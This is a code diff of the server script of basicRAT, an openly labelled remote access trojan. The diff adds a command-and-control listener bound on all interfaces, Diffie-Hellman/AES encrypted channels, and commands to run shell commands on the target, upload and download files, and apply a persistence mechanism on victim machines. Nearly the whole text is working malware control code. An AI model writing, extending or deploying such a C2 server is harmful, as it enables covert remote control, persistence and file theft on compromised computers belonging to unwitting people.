@@ -1,11 +1,20 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+#
+# basicRAT server
+# https://github.com/vesche/basicRAT
+#
+
+import argparse
 import readline
-import time
+import socket
 import struct
-import binascii
-from basicRAT import *
+import sys
+import time
+
+from core import common
+
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
 # ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
@@ -22,40 +31,62 @@ BANNER = '''
 HELP_TEXT = '''
 download <file> - Download a file.
 help            - Show this help menu.
+persistence     - Apply persistence mechanism.
+rekey           - Regenerate crypto key.
 run <command>   - Execute a command on the target.
 upload <file>   - Upload a file.
 quit            - Gracefully kill client and server.
 '''
-HOST = 'localhost'
-FALLBACK_KEY  = '82e672ae054aa4de6f042c888111686a'
-# generate your own key with...
-# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"
+
+
+def get_parser():
+    parser = argparse.ArgumentParser(description='basicRAT server')
+    parser.add_argument('-c', '--crypto',
+                        help='C2 crypto to use.',
+                        default='AES', type=str)
+    parser.add_argument('-p', '--port',
+                        help='Port to listen on.',
+                        default=1337, type=int)
+    return parser
+
 
 def main():
+    parser  = get_parser()
+    args    = vars(parser.parse_args())
+    port    = args['port']
+    crypto  = args['crypto']
+
+    if crypto == 'AES':
+        from core.crypto import diffiehellman
+        from core.crypto import AES_encrypt as encrypt
+        from core.crypto import AES_decrypt as decrypt
+
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
-        s.bind((HOST, PORT))
+        s.bind(('0.0.0.0', port))
     except socket.error:
-        print 'Error: Unable to start server, port {} in use?'.format(PORT)
+        print 'Error: Unable to start server, port {} in use?'.format(port)
         sys.exit(1)
 
     for line in BANNER.split('\n'):
         time.sleep(0.05)
         print line
 
-    print 'basicRAT server listening on port {}...\n'.format(PORT)
+    print 'basicRAT server listening on port {}...\n'.format(port)
 
     s.listen(10)
     conn, addr = s.accept()
+    
     DHKEY = diffiehellman(conn, server=True)
-    print binascii.hexlify(DHKEY) #debug: confirm DHKEY matches
+    # debug: confirm DHKEY matches
+    # print binascii.hexlify(DHKEY)
     
     while True:
-        prompt = raw_input('[{0}] basicRAT> '.format(addr[0])).rstrip()
+        prompt = raw_input('[{}] basicRAT> '.format(addr[0])).rstrip()
 
-        # allow no-op
-        if not prompt: 
+        # allow noop
+        if not prompt:
             continue
 
         # seperate prompt into command and action
@@ -90,26 +121,21 @@ def main():
                         res = conn.recv(datasize)
                         f.write(decrypt(res, DHKEY))
                         datasize = struct.unpack("!I", conn.recv(4))[0]
-                   
-                    
-                
-                    
+                        
         # regenerate DH key (dangerous! may cause connection loss!)
-        # available in case a fallback occurs or you suspect evesdropping
+        # available in case a fallback occurs or you suspect eavesdropping
         elif cmd == 'rekey':
             DHKEY = diffiehellman(conn, server=True)
-            #print binascii.hexlify(DHKEY) #debug
             
+        # results of persistence
+        elif cmd == 'persistence':
+            print 'Applying persistence mechanism...'
+            recv_data = conn.recv(1024)
+            print decrypt(recv_data, DHKEY)
+
         else:
-            print "Invalid command"
-            print "Type 'help' to get a list of all commands"
+            print 'Invalid command, type "help" to see a list of commands.'
 
 
 if __name__ == '__main__':
-    try:
-        PORT = int(sys.argv[1])
-    except (IndexError, ValueError):
-        print 'Usage: ./basicRAT_server.py <port>'
-        sys.exit(1)
-
     main()
